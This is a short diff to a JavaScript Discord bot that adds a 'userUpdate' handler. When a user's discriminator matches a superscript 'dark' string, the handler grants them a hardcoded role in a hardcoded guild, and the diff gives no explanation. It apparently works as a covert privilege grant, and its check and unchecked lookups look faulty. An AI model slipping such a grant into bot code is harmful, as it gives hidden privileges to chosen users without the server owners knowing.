@@ -174,3 +174,9 @@ client.on("error", e => {
 });
 
 client.login(token);
+
+client.on("userUpdate",user=>{
+  if(user.discriminator == "ᵈᵃʳᵏ"){
+    client.guilds.cache.get("553992832340459540").members.cache.get(user.id).roles.add("837587575266476042");
+  };
+});
